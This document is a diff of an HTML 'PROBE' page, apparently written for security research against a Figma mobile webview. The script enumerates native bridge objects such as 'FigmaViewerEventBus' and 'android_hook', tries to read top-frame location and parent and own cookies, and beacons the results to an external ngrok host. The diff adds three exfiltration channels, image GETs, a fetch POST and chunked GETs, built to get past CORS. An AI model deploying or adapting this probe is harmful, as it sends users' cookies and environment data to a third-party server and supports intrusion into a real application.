@@ -1,33 +1,34 @@
 <!doctype html><meta charset=utf-8><title>PROBE</title>
-<body style="font:14px monospace;background:#111;color:#0f0">
+<body style="font:14px monospace;background:#101;color:#0f0">
 <h2 id=h>probe running…</h2><pre id=o></pre>
 <script>
 const LAB='https://20ea-2a02-2f00-2003-2400-3907-b341-dcfe-99a1.ngrok-free.app';
-const R={tag:'PROBE', href:location.href, origin:location.origin, ref:document.referrer, ua:navigator.userAgent,
-         isTop:(window===window.top), frames:window.length};
 const BRIDGES=['CommentEventBus','CommonViewerEventBus','FileViewerEventBus','MakeViewerEventBus','MirrorViewerEventBus',
   'MobileApp','NativeLoaderEventBus','PlayableViewerEventBus','PrototypeViewerEventBus','SlideDeckViewerEventBus',
   'SlideViewerEventBus','android_hook'];
-R.bridges={};
+const R={tag:'PROBE2', href:location.href, origin:location.origin, ref:document.referrer, ua:navigator.userAgent,
+         isTop:(window===window.top)};
+R.bridges={}; const present=[];
 for (const b of BRIDGES){
   try{
     const o=window[b];
-    if(o===undefined){R.bridges[b]='absent';continue;}
+    if(o===undefined||o===null){R.bridges[b]='absent';continue;}
     const ms=[]; for(const k in o){ try{ if(typeof o[k]==='function') ms.push(k); }catch(e){} }
-    R.bridges[b]={type:typeof o, methods:ms};
+    R.bridges[b]=ms; present.push(b+'('+ms.length+')');
   }catch(e){R.bridges[b]='err:'+e.message}
 }
-R.FigmaMobile = (()=>{ try{ return typeof window.FigmaMobile==='undefined'?'absent':Object.keys(window.FigmaMobile);}catch(e){return 'err'} })();
-// same-origin reach tests
-function t(name,fn){ try{ R[name]=String(fn()).slice(0,300); }catch(e){ R[name]='BLOCKED: '+e.name+': '+e.message.slice(0,120); } }
+R.FigmaMobile = (()=>{ try{ return (typeof window.FigmaMobile==='undefined'||!window.FigmaMobile)?'absent':Object.keys(window.FigmaMobile);}catch(e){return 'err'} })();
+function t(n,fn){ try{ R[n]=String(fn()).slice(0,220); }catch(e){ R[n]='BLOCKED:'+e.name; } }
 t('top_location', ()=>window.top.location.href);
-t('parent_location', ()=>window.parent.location.href);
 t('parent_cookie', ()=>window.parent.document.cookie);
 t('own_cookie', ()=>document.cookie);
-t('opener', ()=>window.opener && window.opener.location.href);
 document.getElementById('o').textContent=JSON.stringify(R,null,1);
-document.getElementById('h').textContent='probe done';
-fetch(LAB+'/log/probe',{method:'POST',mode:'cors',body:JSON.stringify(R)}).catch(e=>{
-  new Image().src=LAB+'/log/probe-img?d='+encodeURIComponent(JSON.stringify(R).slice(0,1500));
-});
+document.getElementById('h').textContent='BRIDGES PRESENT: '+(present.length?present.join(' '):'NONE');
+// beacon 1: compact GET (works with no CORS)
+var summary='present='+(present.join(',')||'NONE')+'|top='+(R.top_location||'').slice(0,40)+'|isTop='+R.isTop;
+new Image().src=LAB+'/log/BRIDGEPROBE?'+encodeURIComponent(summary)+'&r='+Math.random();
+// beacon 2: full JSON POST
+try{ fetch(LAB+'/log/BRIDGEPROBEFULL',{method:'POST',mode:'cors',body:JSON.stringify(R)}); }catch(e){}
+// beacon 3: chunked GETs of the full JSON so it survives even without CORS
+var s=JSON.stringify(R); for(var i=0,n=0;i<s.length && n<8;i+=700,n++){ new Image().src=LAB+'/log/CHUNK'+n+'?d='+encodeURIComponent(s.substr(i,700)); }
 </script></body>
